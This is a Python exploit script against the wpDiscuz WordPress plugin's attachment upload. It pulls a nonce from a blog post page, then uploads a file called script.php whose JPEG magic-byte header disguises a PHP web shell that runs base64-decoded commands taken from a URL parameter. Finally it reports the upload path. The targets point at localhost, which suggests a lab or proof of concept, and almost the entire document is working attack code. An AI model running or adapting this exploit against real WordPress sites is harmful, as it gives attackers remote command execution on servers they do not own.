import requests
import re
import sys
import random
import string
import json
import traceback

from base64 import b64decode

post_url = "http://127.0.0.1/index.php/2021/06/06/post"
admin_ajax_url = "http://127.0.0.1/wp-admin/admin-ajax.php"
webkit_boundary = bytes(random.choices(string.digits.encode("ascii"), k=27)).decode(
    "ascii"
)

post_data = """
-----------------------------{{WEBKIT_BOUNDARY}}
Content-Disposition: form-data; name="action"

wmuUploadFiles
-----------------------------{{WEBKIT_BOUNDARY}}
Content-Disposition: form-data; name="wmu_nonce"

{{WPDISQUZ_NONCE}}
-----------------------------{{WEBKIT_BOUNDARY}}
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
-----------------------------{{WEBKIT_BOUNDARY}}
Content-Disposition: form-data; name="wmu_files[0]"; filename="{{MALICIOUS_FILENAME}}"
Content-Type: {{MALICIOUS_CONTENT_TYPE}}

{{MALICIOUS_HEADER}}
{{PHP_SCRIPT}}
-----------------------------{{WEBKIT_BOUNDARY}}
Content-Disposition: form-data; name="postId"

{{WORDPRESS_POST_ID}}
-----------------------------{{WEBKIT_BOUNDARY}}--

""".encode()

proxies = {"http": "http://127.0.0.1:8080"}


def extract_nonce():
    response = requests.get(url=post_url)
    content = response.content.decode().replace(" ", "")

    x = re.search(r"wmuSecurity.:.([a-f0-9] ).,", content)
    try:
        y = x.group(1)
        return y
    except Exception as e:
        print(f"[!] Couldn't extract wpdiscuz_subscribe_form_nonce from the blog post")

        traceback.print_exc()
        sys.exit(1)


def prepare_data(nonce):

    global post_data

    filename = "script.php"
    content_type = "application/php"
    header = b64decode("/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAA4J")
    php_script = "<?php system(base64_decode($_GET['rbct'])); ?>"
    post_id = 1

    post_data = post_data.replace(b"{{WPDISQUZ_NONCE}}", nonce.encode())
    post_data = post_data.replace(b"{{MALICIOUS_FILENAME}}", filename.encode())
    post_data = post_data.replace(b"{{MALICIOUS_CONTENT_TYPE}}", content_type.encode())
    post_data = post_data.replace(b"{{MALICIOUS_HEADER}}", header)
    post_data = post_data.replace(b"{{PHP_SCRIPT}}", php_script.encode())
    post_data = post_data.replace(b"{{WORDPRESS_POST_ID}}", str(post_id).encode())
    post_data = post_data.replace(b"{{WEBKIT_BOUNDARY}}", webkit_boundary.encode())


def upload_file():
    headers = {
        "Content-Type": f"multipart/form-data; boundary=---------------------------{webkit_boundary}"
    }

    try:
        response = requests.post(
            admin_ajax_url, headers=headers, data=post_data, proxies=proxies
        )
        content = response.content.decode()

        content_json = json.loads(content)

        images = content_json["data"]["previewsData"]["images"]
        for x in images:
            upload_path = x["url"]
            print(f"[ ] File uploaded correctly.")
            print(f"[ ] Location: {upload_path}")
    except Exception as e:
        print(f"[!] Couldn't upload file")

        traceback.print_exc()
        sys.exit(1)


def main():
    nonce = extract_nonce()
    prepare_data(nonce)
    upload_file()


if __name__ == "__main__":
    main()
